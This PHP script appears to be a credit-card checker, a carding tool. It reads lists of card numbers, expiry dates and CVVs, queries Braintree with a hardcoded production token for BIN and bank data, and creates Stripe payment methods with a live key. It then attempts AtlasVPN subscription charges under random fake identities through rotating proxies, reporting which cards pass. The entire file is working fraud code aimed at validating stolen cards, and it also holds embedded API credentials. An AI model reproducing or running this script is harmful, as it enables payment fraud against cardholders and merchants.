<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", "/", " "), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$zip = rand(10001,90045);
$time = rand(30000,699999);
$rand = rand(0,99999);
$pass = rand(0000000000,9999999999);
$email = substr(md5(mt_rand()), 0, 7);
$name = substr(md5(mt_rand()), 0, 7);
$last = substr(md5(mt_rand()), 0, 7);

/// Request 1 Grab guid sid muid///
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_PROXY, $url[array_rand($url)]);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpass[array_rand($userpass)]);
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: m.stripe.com',
'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
'Accept: */*',
'Accept-Language: en-US,en;q=0.5',
'Content-Type: text/plain;charset=UTF-8',
'Origin: https://m.stripe.network',
'Referer: https://m.stripe.network/inner.html'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "");
$res = curl_exec($ch);
$muid = trim(strip_tags(getStr($res,'"muid":"','"')));
$sid = trim(strip_tags(getStr($res,'"sid":"','"')));
$guid = trim(strip_tags(getStr($res,'"guid":"','"')));

///GRAB BINDATA FROM BRAINTREE///
$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: payments.braintree-api.com',
   'Authorization: Bearer production_jy3wzpy3_tg2vn79sv48ckjmr',
   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
   'Braintree-Version: 2018-05-10',
   'Content-Type: application/json',
   'Accept: */*',
   'Origin: https://assets.braintreegateway.com',
   'Sec-Fetch-Site: cross-site',
   'Sec-Fetch-Mode: cors',
   'Sec-Fetch-Dest: empty',
   'Referer: https://assets.braintreegateway.com/',
   'Accept-Language: en-US,en;q=0.9'));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"9386fb83-9167-4b9b-bf7a-77cd97bb1e71"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 $result = curl_exec($ch);
 $brand = trim(strip_tags(getStr($result,'"brandCode":"','"')));
 $bank = trim(strip_tags(getStr($result,'"issuingBank":"','"')));
 $country = trim(strip_tags(getStr($result,'"countryOfIssuance":"','"')));
 $prepaid = trim(strip_tags(getStr($result,'"prepaid":"','"')));
 $debit = trim(strip_tags(getStr($result,'"debit":"','"')));
 
///2nd REQ///
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.stripe.com',
   'Accept: application/json',
   'Accept-Language: en-US,en;q=0.9',
   'Content-Type: application/x-www-form-urlencoded',
   'Origin: https://js.stripe.com',
   'Referer: https://js.stripe.com/',
   'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Fc478317df%3B+stripe-js-v3%2Fc478317df&time_on_page=$time&referrer=https%3A%2F%2Fatlasvpn.com%2F&key=pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf");
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));

///Final Stage///
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://user.atlasvpn.com/v1/stripe/pay');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Accept: application/json, text/plain, */*',
  'Accept-Language: en-US,en;q=0.9',
  'content-type: application/json;charset=UTF-8',
  'Host: user.atlasvpn.com',
  'Origin: https://atlasvpn.com',
  'Referer: https://atlasvpn.com/',
  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.''.$rand.'@gmail40.com","name":"'.$name.' '.$last.'","payment_method_id":"'.$id.'","identifier":"com.atlasvpn.vpn.subscription.p1m.stripe_regular_2","currency":"USD","postal_code":"'.$zip.'"}');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'"code":"','"')));
  
if($msg == null) {
echo '{"res":"AUTH[PASS]✅","brand":"'.$brand.'","bank":"'.$bank.'","country":"'.$country.'"}';
}
elseif($result2 == null) {
echo '{"res":"API DOWN❌","brand":"'.$brand.'","bank":"'.$bank.'","country":"'.$country.'"}';
}
else{
echo '{"res":"❌'.$msg.'","brand":"'.$brand.'","bank":"'.$bank.'","country":"'.$country.'"}';
}
curl_close($ch);
ob_flush();

?>
